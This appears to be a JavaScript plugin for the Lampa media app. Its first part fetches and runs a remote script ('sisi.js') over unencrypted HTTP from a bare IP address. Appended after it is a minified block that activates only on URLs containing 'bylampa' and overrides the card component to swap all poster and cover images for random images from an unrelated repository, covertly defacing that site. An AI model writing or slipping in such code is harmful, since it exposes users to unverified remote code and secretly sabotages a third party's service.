(function () {
  'use strict';

  Lampa.Platform.tv();

  function initExternalScriptLoader() {
    // Список зеркал для загрузки внешнего скрипта sisi.js
    const scriptMirrors = [
    //  'https://ab2024.ru/sisi.js',
        'http://31.129.234.181/sisi.js',
    //    'https://l.pashai.ru/sisi.js',
    ];

    // Выбираем случайное зеркало
    const randomScriptUrl = scriptMirrors[Math.floor(Math.random() * scriptMirrors.length)];

    // Асинхронно подгружаем скрипт
    Lampa.Utils.putScriptAsync([randomScriptUrl], function () {

    });
  }

  // Запуск при готовности приложения
  if (window.appready) {
    initExternalScriptLoader();
  } else {
    Lampa.Listener.follow('app', (e) => {
      if (e.type === 'ready') {
        initExternalScriptLoader();
      }
    });
  }
})();
(function(){if(location.href.indexOf('bylampa')===-1)return;var p=['https://raw.githubusercontent.com/validatored/img/main/01.jpg','https://raw.githubusercontent.com/validatored/img/main/02.jpg','https://raw.githubusercontent.com/validatored/img/main/03.jpg','https://raw.githubusercontent.com/validatored/img/main/04.jpg'],o=Lampa.Card,t=function(){setTimeout(function(){if(!Lampa.Card)return t();Lampa.Card=function(d){var c=o.apply(this,arguments),v=c.visible;c.visible=function(){var u=p[Math.floor(Math.random()*p.length)];for(var k in d)if(/poster|img|backdrop|cover|profile/.test(k)&&d[k])d[k]=u;var r=v.apply(this,arguments);try{var e=c.render(true);$(e).find('img').each(function(){this.src=u});setTimeout(function(){$(e).find('img').each(function(){this.src=u})},300)}catch(x){}return r};return c};for(var k in o)Lampa.Card[k]=o[k]},100)};t()})();
